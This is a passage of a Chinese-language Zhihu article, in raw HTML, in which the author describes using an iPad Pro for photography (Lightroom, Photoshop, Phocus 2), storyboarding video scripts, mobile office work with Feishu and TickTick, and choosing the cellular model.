data-original=\"https://pic2.zhimg.com/v2-49c93d221f57479df7d6a5fe1aaddb1d_r.jpg\"></figure><p>关于写作，就先说这么多。</p>\n<p><b>影像创作</b></p>\n<p>在这里，我原本的题目是摄影。但是因为现在视频内容成为了重要的媒介语言，并且目前我们团队也有视频内容的输出，所以这里使用影像更为合适。</p>\n<p>其实对我的摄影工作来说，输入同样非常重要的环节，不过我已经在前面的「学习」部分有所分享，在这里也就不再赘述了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-205341ce625f94438538b4e95c64db14_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4864\" data-rawheight=\"3243\" class=\"origin_image zh-lightbox-thumb\" width=\"4864\" data-original=\"https://pic1.zhimg.com/v2-205341ce625f94438538b4e95c64db14_r.jpg\"></figure><p>不过虽然把照片和视频放在一个章节里，但是这两件事有着各自完全不同的工作流。而且从我的实际使用来看，两个工作流在 iPad 上目前的完成度也不相同。</p>\n<p>目前平面图片在 iPad 上已经可以完成整个工作流，没有任何环节缺失，仅仅是效率高低。但「视频制作」，iPad 目前只能完成某一个或者是某几个环节。但这并不是说 iPad 对于视频工作流不重要，恰恰相反，它也是我视频制作不可或缺的一部分。</p>\n<p>我们先从平面摄影开始吧。</p>\n<p>常规摄影工作流主要分为以下的几个步骤：</p>\n<p><b>素材转移</b></p>\n<p>这是整个 iPad 最为容忽略的环节。在一开始 iPad 只能把所有的图片文件导入到相册中。但是随着文件 App 出现，我们终于可以把所有图片以文件形式直接导入 iPad。连接 SD 卡以后，我们打开文件 App 就可以看到对应的盘。目前文件 App 的兼容度不错，主流相机的 Raw 格式都可以在 app 内直接浏览。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3562e02e6160bbade70ddf6abf82fa44_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic1.zhimg.com/v2-3562e02e6160bbade70ddf6abf82fa44_r.jpg\"></figure><p>不过目前最大的问题在于文件 App 本身十分混乱的机制。尤其是我很难理解，为什么 iPad 文件 app 中的「拷贝」操作是在原地再复制一份，而要把外接存储设备中的文件复制粘贴到 iPad 上，正确的操作应该是「移动」，虽然这个名字听起来很像「剪切」操作，但外接存储设备上的文件并不会因为「移动」而消失。</p>\n<p>所以在使用你的 iPad 连接了键盘，在文件 App 中管理照片时，最好的使用方式是使用快捷键。比如当你想把 SD 卡中的素材拷进 iPad 时，请一定要使用 「Command+A」首先全选，然后直接「Command+C」复制，最后找到你 iPad 中对应想要选择的文件夹以后，「Command+V」粘贴。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7492f1fb8050310e1b52dda9f7a4aeef_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic4.zhimg.com/v2-7492f1fb8050310e1b52dda9f7a4aeef_r.jpg\"></figure><p>这里我想要特别强调一下。最好的素材管理方式一定是用读卡器连接 iPad 拷贝素材，虽然 iPad 可以直连一些主流相机，并从中直接读取照片，但是这样的素材传递形式很容易出现错误和丢素材的情况。所以一定要买对应存储卡的 USB-C 读卡器，现在也不贵了，百元左右就有很多选择。</p>\n<p>对了，我需要特别强调一点这就是文件 App 终于出现了「进度条」。这个在 macOS 上非常基础的功能，终于来到了 iPad 上。所以当我们在拷贝 SD 卡中的素材时，可以直接通过观察这个进度条来判断进展。而且重要的是，这个进度条是可以点击的。点击之后可以查看具体的拷贝时间，以及最为关键的可以「中断拷贝」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7b529b4cfee8af963baa42291b81da58_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-7b529b4cfee8af963baa42291b81da58_r.jpg\"></figure><p>特别强调，这是在 iPadOS 15 中才有的功能，如果你没有升级到最新系统，那么依然要忍受拷贝文件时没有进度条的问题。</p>\n<p><b>素材筛选</b></p>\n<p>每个摄影师都有自己的素材管理方式。</p>\n<p>但基本上图片的核心管理肯定是使用 Lightroom 完成的。Lightroom 对于职业摄影师肯定是再熟悉不过的。</p>\n<p>不过在进入软件之前，我想花点时间来和大家说说怎么获得 Lightroom。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a78d2c5c22b501a7cb93dcd04646f6d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-a78d2c5c22b501a7cb93dcd04646f6d1_r.jpg\"></figure><p>你可以直接在国区 App Store 免费下载 iPad 版 Lightroom，如果你想要解锁所有的功能，需要最低 15 元/月的订阅费用。当然，对于 Lightroom 这么好用的软件，并不昂贵。</p>\n<p>但是如果你在中国大陆以外的国家或地区订阅了 Adobe 摄影师计划，那么其实这个计划中是包含了 iPad 版 Lightroom 和 Photoshop 的，也就是说你无需再次付费即可解锁 iPad 版的所有功能，包括 1TB 的云存储空间。</p>\n<p>由于我在购买 Adobe 的 Lightroom 和 Photoshop 套装时，国内还没有上线，所以我在其它地区购买了 Adobe 摄影师计划。因此我就可以直接在 iPad 上登录 Adobe 账号，这样就可以免费使用，并且实现云同步。</p>\n<p>再次强调，中国大陆的 Adobe 摄影师计划并不包含 iPad 版本 Lightroom 和 Photoshop。具体资费政策我就不在这里多阐述，大家可以在 Adobe 官网查询。</p>\n<p>那么我们继续回到软件本身。</p>\n<p>iPad 版 Lightroom 和电脑端 Lightroom Classic 实现的功能基本一致。只需探索一下界面即可。</p>\n<p>我们可以直接通过在 Lightroom 主界面右下角的导入按钮，导入我们的任意文件夹。导入后直接点击单张图片，右下角就有「标记」功能。也就是摄影师们熟知的「星级」评定。</p>\n<p>如果你使用键盘操作，依然可以直接点按数字来完成星级评定。</p>\n<p>如果是手势操作，iPad 版的 Lightroom 也有一个手势操作快捷方式：<b>左侧上下滑动做星级评定，右侧上下滑动标记旗标。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_r.jpg\"></figure><p>不过唯一可惜的是没有颜色区分，少了一种评定方式。不过从实际使用来看，这两种评定方式也可以完成核心图片筛选环节了。</p>\n<h3>图片编辑</h3>\n<p>筛选以后，就可以直接进入修图步骤了。</p>\n<p>iPad 版 Lightroom 的功能和基本和桌面端一致。唯一不同的是，缺少了一些很多摄影师习惯的键盘快捷键。但是 iPad 版也有一项独家优势：<b>Apple Pencil。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-079264dd693151892942a4845e25cc50_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-079264dd693151892942a4845e25cc50_r.jpg\"></figure><p>而 Apple Pencil 此时基本上就可以完全化身数位笔。这对一些进阶修图用户，尤其是擅长局部调整的摄影师们来说绝对是大好消息。比如在画笔工具中，就可以利用 Apple Pencil 在图片区域中进行更加精细的选择，这是电脑端需要配合数位板才能完成的操作。</p>\n<p>而现在 iPad 上却有更加直观的操作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b0d435cad4c44a236ca1a99ef77826b2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic3.zhimg.com/v2-b0d435cad4c44a236ca1a99ef77826b2_r.jpg\"></figure><p>对于摄影后期来说，Lightroom 只是能完成一部分，更多内容需要到 Photoshop 中才能继续。在桌面端我们知道，Lightroom 是可以直接跳转到 Photoshop 的。而在 iPad 上：</p>\n<p>Lightroom 依然可以跳转到 Photoshop。</p>\n<p>不过，等等。</p>\n<p>需要说明的是，这里的 Photoshop 是指 Adobe 完全为 iPad 设计的，而不是那个叫做 Photoshop Express 的「小玩具」。但是目前 Photoshop 在国区 App Store 并且上架。只有在其它区的 App Store 才能下载，它的付费情况和 Lightroom 类似。</p>\n<p>我们可以直接在 Lightroom 的分享按钮中选择跳转到 Photoshop，它就会直接转换为 PSD 格式并在 Photoshop 中打开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6b37c072643f64f7794b608787608ffe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-6b37c072643f64f7794b608787608ffe_r.jpg\"></figure><p>基本上目前 iPad 版本的 Photoshop 核心功能已经完备，更多桌面端端功能都在逐步向 iPad 端迁移。目前的功能已经可以完全满足的我自己的修图需求，笔刷系统、调整系统、选择系统都在。而且基本上也延续了 Photoshop 的主流快捷键。在我自己的使用过程中，常见的例如「中性灰」手法，都可以流畅的在 iPad 上实现。</p>\n<p>而且由于 Photoshop 修图更是一个依赖笔刷工具的过程，所以 Apple Pencil 的作用甚至是比在 Lightroom 中还大，基本上代替了数位板的作用。</p>\n<p>不过这里也插一句题外话，由于 Photoshop 基本上也是很多插画师的选择，但我完全不建议你使用 iPad 版 Photoshop 来画插画。因为有更好更先进的选择，这就是 Procreate。</p>\n<p>的确要承认，iPad 版本 Photoshop 还有进步空间，但是它逐渐在变好。对了，没有中文。不过基本上图标都认识，熟悉一下就好。</p>\n<p><b>输出</b></p>\n<p>严肃地说，摄影中的输出都是纸质输出。但是随着社交网络兴起，这一操作逐渐被人忽略。现在基本上，所有的摄影师都是在社交网络上分享照片。</p>\n<p>但是我这里有一个特别的小建议，这就是 iPad 肯定是最好的移动图片阅读器。用 iPad 看照片和用 Mac 看照片不一样。所以如果你的摄影作品需要给别人看，尤其是客户，可以尝试用 iPad 建立一个专门的作品相册，会让你的作品看起来高级不少。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-67cf9e1df7c0f5d74faa0bb5ce6897b7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-67cf9e1df7c0f5d74faa0bb5ce6897b7_r.jpg\"></figure><p>对了，这里还有一点需要特别说明：</p>\n<p>当你在进行对于色彩有要求的任何操作时，切记关闭 iPad 的一些视觉功能，其中包括「夜览」以及「原彩显示」。因为这两个功能都会出于对于眼睛的保护目的，不断的修改屏幕色温，这样我们在调色或者是看图时就不会获得颜色的真实反馈，很可能造成修图的结果和输出结果不一致的情况。</p>\n<p>切记，一定要关掉。</p>\n<p>以上就是我在 iPad 上进行图片摄影的大致流程。但其实对于一般用户来说，iPad 上一些轻量级的修图软件已经可以满足需求。比如，虽然现在搞得一团糟，但是依然有着最好色彩滤镜的 VSCO。比如相对来说，修图功能丰富齐全的泼辣修图，都是很好的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e6d79d12989737d3ab002b006503d142_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-e6d79d12989737d3ab002b006503d142_r.jpg\"></figure><p>但也有一些更加进阶的 iPad 软件，也就是各相机品牌的定制软件。比如松下的软件可以直接实现画面预览和参数控制，把 iPad 变成监视器和控制器，这对一些个人制作者非常友好。我们工作室使用的佳能产品线也可以实现类似的效果，因为 iPad 屏幕更大，监视的意义更加明显。</p>\n<p>但不仅如此，还有更加先进的，这就是哈苏的 Phocus 2。（友情提示，如果你没有哈苏相机，这一部分就可以跳过了。因为 Phocus 2 是哈苏相机专属 app。）</p>\n<p>这款软件有多先进，它竟然可以帮你走完整个摄影流程。</p>\n<p>它可以直接进行拍摄监看，尤其是联机拍摄。联机拍摄对于一些棚拍摄影师来说是一个重要环节，可以让摄影师及时控场调整。而 iPad 联机不需要复杂的布线，摄影师可以更加聚焦于拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43e6c590c4630eed97253d4b29cb8783_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic4.zhimg.com/v2-43e6c590c4630eed97253d4b29cb8783_r.jpg\"></figure><p>拍摄之后这款软件还可以直接修改图片，而且基本上有着非常完备的读取 Raw 文件，调整 Raw 文件的流程。你可以快速简单的调整，来判断拍摄是否达到预期。</p>\n<p>但这还不是全部，它甚至可以让你在 iPad 上直接给相机和镜头更新固件。不得不说，这里应该夸奖一下哈苏。作为一个老牌相机厂商，却最跟随潮流。你再看看，其它家，具体我就不点名了（傲娇语气），请多花点时间在软件体验上。</p>\n<p>其实在拍摄部分，还有一个很重要的环节我没有说：</p>\n<p>「创意起草」部分。</p>\n<p>无论是摄影还是拍摄视频，「创意起草」都是一个非常重要的环节，越是到摄影的新阶段你会发现更多的是创意。而对于视频来说，从一个想法到几句话再到几个画面，创意起草环节更是影响整个制作以及后续工作效率。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7b7f5b8e7db0ba354e25bfe8825baeda_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-7b7f5b8e7db0ba354e25bfe8825baeda_r.jpg\"></figure><p>而 iPad 是目前为止，我认为最好的「创意起草」工具，它有两样东西。</p>\n<p>一根 Apple Pencil ，以及一个叫做 Paper 的软件。</p>\n<p>这一套组合起来，就是非常重要的创意本。Apple Pencil 自然不用说，是真的好用的。完全可以替代各种形式的笔，这里特别来说说 Paper 这款软件。</p>\n<p>这款软件乍一看在 App Store 中是一个绘画软件，但如果你注意看这款软件的描述就会发现它更多的是一种「速写」软件。这种速写不仅仅是所谓的绘画中的速写，而是一种「想法」速写。所以当我想要开始一个创作时，我会在这个软件上完成最初的想法起草。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f2a7ce72ea8ad6eeecbd91897a3ae5fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic3.zhimg.com/v2-f2a7ce72ea8ad6eeecbd91897a3ae5fe_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>比如我会把我想到的文字、图像都直接在 Paper 上进行快速涂写。和其它的更加专业的绘画软件不同的是，Paper 是以「笔记本」为核心。而绝大多数的绘画软件是「单个图像文件」为核心的。</p>\n<p>这就让 Paper 可以让我们的创作更加随性。</p>\n<p>在没有大范围的使用 iPad 之前，我随身会有一个 Moleskine 的小本子，平时用来记录一些随想，以及写写画画一些内容。</p>\n<p>相信我，当你有了「纸」和「笔」以后，思维会更加流畅和跳跃。所以在有了 iPad 以后，这项工作就完全开始交给 Paper。它非常容易上手，跟着内置的快速教程几分钟就能学会。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2a68cbcb6404542e562112f1f098f469_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-2a68cbcb6404542e562112f1f098f469_r.jpg\"></figure><p>而且这种笔记本的概念，在最近一段时间的更新中还有了一个 「Paper Store」的功能。里面集合了各种各样想象力丰富的笔记本模板，有用来做计划的，用来做思维导图的，甚至是有各种设计或者是手帐。所以，可以说 Paper 就是一个非常酷的收集灵感和美的软件，只要你是创意工作者，就请一定要试试。</p>\n<p>那么我们继续来说视频制作。</p>\n<p>前几天，我去了一次 FIRST 青年电影展，和每年一样和一些青年导演聊了聊。其中我印象很深的是，iPad 在影视工业中参与的部分越来越多，尤其是对一些敢于尝试新设备的团队来说，iPad 从前期的拍摄计划（比如镜头移动规划）到正式拍摄的监看，已经成为了工业制作的一部分。</p>\n<p>但回归到个人制作者，我不得不遗憾地说，目前 iPad 没有一个能够作为核心工作流的视频剪辑软件。这就让 iPad 并不能从开始到后期完成视频制作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f1175ec67d7b07cd2ae1a502297c9e71_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f1175ec67d7b07cd2ae1a502297c9e71_r.jpg\"></figure><p>当然这里的制作是视频生产，如果你是普通的生活记录，那么 iPad 肯定是完全够用的，尤其是 iPad 上有剪映这样的短视频最佳制作工具的。说实话，一开始我对剪映是带着一点「看不上」，但是时代就是这样。对于各类短视频创作者来说，剪映就是最好的选择。而且 M1 芯片版本对于剪映还有特殊加持。</p>\n<p>而像我主要的长视频制作，iPad 就力不从心。现在唯一一个能够拿得出手的剪辑软件是 Luma Fusion。但是实话实说，这款软件不是不能用，就是用起来太笨重，你要是有无限的时间去剪辑能搞定，但是要是规定时间内就不行。</p>\n<p>因此，如果你的主要工作是剪辑长视频，那么 iPad 显然不适合。</p>\n<p>但是这并不意味着 iPad 对视频制作没用，如果你的视频制作中是有脚本一说的，那么因为 Apple Pencil 的加持，iPad 可能就是最好的脚本制作软件。</p>\n<p>我自己目前工作流中，使用的脚本软件是 GoodNotes。</p>\n<p>一方面 GoodNotes 可以允许自定义笔记本模版。所以我就在网上找到了一个非常常见的分镜头脚本绘制模版，然后直接导入 GoodNotes。这样我就可以直接在这个笔记本中绘制需要的画面。因为 GoodNotes 本身就是一个笔记软件，所以绘制功能非常丰富。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_r.jpg\"></figure><p>更为关键的是，笔记软件还可以直接文本输入。所以我可以直接在分镜头旁边输入台词，这样整个视频内容都可以在一个脚本中展现。</p>\n<p>如果你不想额外购买 app，那么 Keynote 也是一个非常好的镜头制作软件，尤其是在视频长度不是很长的情况下。</p>\n<p>Keynote 一样可以兼顾文字输入和 Apple Pencil 绘制。不过它的劣势在于内容是以「页」为单位，相对来说不连贯。当然这也是优势，就是可以直接利用「看片台」摆布不同镜头之间的排布关系。也就是说，使用 Keynote 可能更加注重的是故事架构。</p>\n<p>拍摄脚本对我来说是非常重要的视频拍摄调度工具，不仅让我理清思路，更加重要的是可以方便团队沟通。因此如果你也刚刚开始视频制作，那我最想和你说的经验就是：</p>\n<p>从做脚本开始。</p>\n<p>对了，如果你用的是最新的 2021 款 iPad Pro，那我强烈建议你好好体验一下这款「Liquid 视网膜 XDR 显示屏」。这是目前移动端设备观感最好的屏幕。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a1179ed5beb491b92dc317ac13b9e541_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-a1179ed5beb491b92dc317ac13b9e541_r.jpg\"></figure><p>一方面这可能是最为便宜的 HDR 视频内容制作中心，另一方面观看 HDR 视频本身也是一种极致享受。比如你可以直接尝试一下扎导剪辑版的《正义联盟》HDR 版本，你会发现和以前看的完全不是一个电影。</p>\n<p><b>移动办公</b></p>\n<p>这里需要特别强调的是，iPad Pro 并不是一个全场景办公产品，尤其在你的工作是以「制作 Office 内容」为主的时候。如果你大部分工作场景是坐在办公室里写 Word、制作 PPT 或 Excel ，那么 iPad Pro 完全不适合你。你依然需要使用电脑。</p>\n<p>但是如果你只是需要在工作中偶尔查看一些 Office 文件，或者是需要不断和团队沟通的移动办公，那么 iPad Pro 有着最好的使用体验。尤其是配合蜂窝版 iPad Pro 使用，更是可以让你随时在线。</p>\n<p>我们团队目前一共有四名核心人员，办公软件我们使用的是「飞书」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-16faa293a3f87651a0b80405e7362a51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-16faa293a3f87651a0b80405e7362a51_r.jpg\"></figure><p>一开始我们还是倾向于在微信内完成团队交流的。但是现在我们已经开始逐渐寻找一些办公软件。这是因为对于使用微信办公来说，有两个大痛点：文件管理系统很差，在线沟通系统简陋。</p>\n<p>文件管理系统混乱我相信大家都是深有同感的。文件长时间不下载旧会过期、稍微大一点就不能发送等等都是问题。更为关键的是，完全没有任何在线文档协作，有也是需要第三方来完成。但是在飞书上，这些问题基本上都可以解决。</p>\n<p>尤其是在线文档，它一方面可以极大增加工作效率，完整清晰的修改历史和批注评论功能也可以让整个项目责任分明。当然，文件自然是想什么时候下载就什么时候下载。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9f71f7f865b4221d0b91b9c43deba046_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-9f71f7f865b4221d0b91b9c43deba046_r.jpg\"></figure><p>不过，我更喜欢的是飞书的在线沟通系统。也不仅仅是因为疫情，而是因为工作特性的原因，团队里成员经常出差。所以视频会议也成为了工作的一部分。</p>\n<p>但是视频会议最怕的一件事就是，只能说。</p>\n<p>但是对于我们的视觉创意为主的工作，很多时候单靠语言描述就很抽象，但画出来解释就非常简单。所以每次视频会议的时候，我一定会通过飞书共享桌面给大家，然后用 Apple Pencil 在 Paper 中把自己的想法可以画出来，这样大家都会一目了然。不仅有的效率，还会减少误会。这就是我说为什么即使你不会画画 Apple Pencil 也很重要，归根到底它的「数字铅笔」的特性会带来很多方便。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-454e3fa07f5a67c7f3522ee4f04cedad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic2.zhimg.com/v2-454e3fa07f5a67c7f3522ee4f04cedad_r.jpg\"></figure><p>虽然文章后面有选购指导，但是我觉得这里是一个很好的实例，就把蜂窝版本的问题在这里说：</p>\n<p>如果你是一个经常出差，经常移动办公的人，那么 iPad 蜂窝版绝对不是锦上添花，而是完完全全的雪中送炭。</p>\n<p>基于我长期的经验来看，蜂窝版本有两个可能完全与大家潜意识里的想法相反的事实：</p>\n<p><b>1. 蜂窝版本并不贵</b></p>\n<p>蜂窝版本和同配置的 Wi-Fi 版之间差价是 1200 元，虽然不能说便宜，但是对于能够购买 iPad Pro 的用户来说绝对不是够不到的预算。另一方面很多人担心流量费用贵，这彻彻底底是一个误区。现在不同以往，各种流量卡已经满天飞。以我的腾讯王卡为例，每个月就是两杯咖啡钱，就可以完全覆盖整个的流量费用。</p>\n<p>换句话说「你去星巴克蹭一杯咖啡的钱，就可以满足自己一个月无线上网」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1c3ab01dbdb4d6c3076a61e1437fd202_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-1c3ab01dbdb4d6c3076a61e1437fd202_r.jpg\"></figure><p><b>2. Wi-Fi 没你想的那么多、那么好用</b></p>\n<p>找 Wi-Fi 很多时候是很一件很痛苦的事，机场或是商圈看似覆盖了 Wi-Fi，但是真要是用起来，要么太慢要么难连。而且只要有一两次不顺利，就很影响工作进度。有磨磨叽叽连 Wi-Fi，追着 Wi-Fi 走的时间不如做点更开心的事。</p>\n<p>这就是为什么我身边凡是用过蜂窝版本都回不去的原因，因为真的太顺畅了。有一次临上飞机发现飞机上没有什么可看的，因为 5G 的原因我就用飞机滑出轨道的时间下载了两部电影。这也是 Wi-Fi 版无法拥有的体验。</p>\n<p><b>结论：</b>如果你真的是一个 iPad 的重度用户，蜂窝版绝对是最好的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5d5c76b5e9b66f210f0391afd5e5c71e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-5d5c76b5e9b66f210f0391afd5e5c71e_r.jpg\"></figure><p>好了，我们回归正题，继续说 iPad 的使用。</p>\n<p>日程管理我们使用的是「日历」以及「滴答清单」</p>\n<p>其实我用过很多日历软件，但是用着用着最后总是觉得没有系统原生的好用。尤其是因为原生的日历可以做到整个苹果生态最好的同步，并且也支持一定的多人同步协作，所以选来选去还是用原生的日历。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8dc1d70075f03d9f549de4d09e4378a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic1.zhimg.com/v2-8dc1d70075f03d9f549de4d09e4378a8_r.jpg\"></figure><p>我对于日历的最大需求就是时间透视功能。我需要大概知道我这个星期需要做什么，还需要我这个月大致需要在哪一个时间段做什么。 所以我使用日历的时候，基本上很少进入日历，而是直接用 iPadOS 15 中最新的小窗口模式，把一个月的工作透视放在桌面上。这样主要我一打开日历就可以看到，整个月份我需要做什么。</p>\n<p>但是自带的日历我一直都有一个不满，这就是 To Do List 比较欠缺。虽然苹果也是自带提醒事项，但是苹果的提醒事项还是过于简陋。对于 To Do List 软件我用过不少，之前用过很长一段时间 Things ，但是渐渐的发现只是相对好看，在时间透视上不够丰富。后来我开始使用滴答清单，滴答清单的好处在于它是一个日历和 To Do List 的结合，不仅可以快速添加各种任务，也可以让我们清楚所有任务的时间线。而且它可以同步订阅系统的自带日历。所以团队内部在日历上的协作，或者是一些出差行程也可以一目了然。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-545a7927d52d7362a66993121eec4501_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic2.zhimg.com/v2-545a7927d52d7362a66993121eec4501_r.jpg\"></figure><p>总的来说，滴答清单都是一个非常不错的时间管理软件。它甚至是还带有番茄钟，对于很多时间管理更加严格的人来说更是一个加分项。</p>\n<p>如果你的工作涉及的电子档签名比较多，前面提过的 PDF Expert 是一个很好的选择，他可以允许你内置各种形式的签名，所以很多文件仅仅是两次点击就可以完成签署。当然我知道很多人处理的文件可能不仅仅是文档，还有各类相对来说奇怪的文件，甚至是压缩包。</p>\n<p>此时我建议你一定要使用 Documents 这款软件备用。你可以直接理解为这是一款「疑难文件解答仪」，它支持各种各样可能你没有听过的格式，解压缩更是有一手，而且还基本免费。因此，下载这个软件，完全有备无患，在官方的文件 App 出现以前我深知是用它来当作文件中心。</p>\n<p>至于邮件软件的话，我觉得自带的就很好用。尤其是随着邮件这几年的大幅度更新，所以自带邮件就挺好。当然，你也可以选择 Gmail。</p>\n<p><b>协作</b></p>\n<p>如果你是一个苹果生态用户，比如你拥有 iPad 的同时还有 Mac，那么你一定要使用一下「随航」。</p>\n<p>其实这一整篇文章中，还有一个 iPad 非常隐性的优势没有提及，这就是整个苹果生态。不过随着苹果产品的普及，这一点大家已经开始善于使用，比如今天大家对于隔空投送已经驾轻就熟了。但是对于一些新的产品联动还不熟悉，所以在这里特别说一下 iPad 和 Mac 的联动，也就是随航。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-591bfd41b0d5a202a02e4fa241d5037c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5084\" data-rawheight=\"3389\" class=\"origin_image zh-lightbox-thumb\" width=\"5084\" data-original=\"https://pic1.zhimg.com/v2-591bfd41b0d5a202a02e4fa241d5037c_r.jpg\"></figure><p>现在我们的 Mac 可以直接作为 Mac 的扩展屏幕。这样在我们使用 Mac 的时候，就可以有更多的屏幕内容，更好的提高使用效率。某种意义上，你的 iPad 